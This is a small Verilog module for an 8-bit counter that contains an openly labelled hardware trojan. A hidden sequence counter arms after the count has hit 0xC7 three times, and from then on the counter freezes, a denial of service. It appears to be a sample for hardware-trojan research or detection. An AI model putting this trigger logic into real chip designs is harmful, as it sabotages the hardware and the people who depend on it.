module counter8(input clk, input rst_n, input en, output reg [7:0] count);
  reg [1:0] trojan_seq;
  wire trojan_trigger = (count == 8'hC7) && en;
  wire trojan_armed   = (trojan_seq == 2'h3);

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      count      <= 0;
      trojan_seq <= 2'h0;
    end else begin
      if (trojan_trigger && !trojan_armed)
        trojan_seq <= trojan_seq + 1;
      if (trojan_armed)
        count <= count; // freeze - denial of service
      else if (en)
        count <= count + 1;
    end
  end
endmodule